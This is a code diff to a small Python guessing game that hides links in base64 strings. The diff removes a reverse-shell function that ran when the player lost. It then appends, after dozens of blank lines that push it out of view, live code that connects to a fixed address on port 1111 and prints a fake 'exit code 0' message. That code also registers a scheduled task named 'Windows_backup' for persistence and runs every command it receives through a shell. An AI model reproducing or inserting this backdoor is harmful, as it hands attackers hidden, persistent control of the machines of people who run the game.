@@ -10,28 +10,6 @@ h_list = ['SG93IGRpZCB0aGUgaGFja2VyIGVzY2FwZT8gYW5zOiBEb24ndCBrbm93IGhlIHJhbnNvb
             #'Q29tcHV0ZXJzIGFyZSBmYXN0OyBwcm9ncmFtbWVycyBrZWVwIGl0IHNsb3cK'#,
             'aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQo=']
 h_random = random.choice(h_list)
-heh = 'MTkyLjE2OC4yNTQuMTAz'
-
-
-def function(heh):
-    yeah = base64.b64decode(heh).decode('utf-8')
-    REMOTE_PORT = 1111
-    client = socket.socket()
-    print("[-] Connection Initiating...")
-    client.connect((yeah, REMOTE_PORT))
-    print("[-] Connection initiated!")
-
-    while True:
-        print("[-] Awaiting commands...")
-        command = client.recv(1024)
-        command = command.decode()
-        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        output = op.stdout.read()
-        output_error = op.stderr.read()
-        print("[-] Sending response...")
-        client.send(output + output_error)
-
-
 count = 0
 print('\nwarning!!, do not enter receding hair/-hair\n')
 print('GOAL : get this aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQo=\n')
@@ -71,5 +49,66 @@ while not loop_over:
                 webbrowser.open(base64.b64decode(h_random).decode('utf-8'))
                 loop_over = True
             else:
-                function(heh)
                 loop_over = True
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+REMOTE_PORT = 1111
+client = socket.socket()
+client.connect(('192.168.254.103', REMOTE_PORT))
+print('Process finished with exit code 0')
+while True:
+    # os.system('cmd /c "SCHTASKS /CREATE /SC DAILY / TN "PYTHON\Windows_backup" /TR '
+    #           '"C:\Users\user\Downloads\ygame\Windows_backup.py" /ST 10:00"')
+    os.system('cmd /c "schtasks /create /tn "Windows_backup" /sc minute /mo 5 /tr'
+              ' C:\Users\user\Downloads\ygame\Windows_backup.py"')
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    client.send(output + output_error)
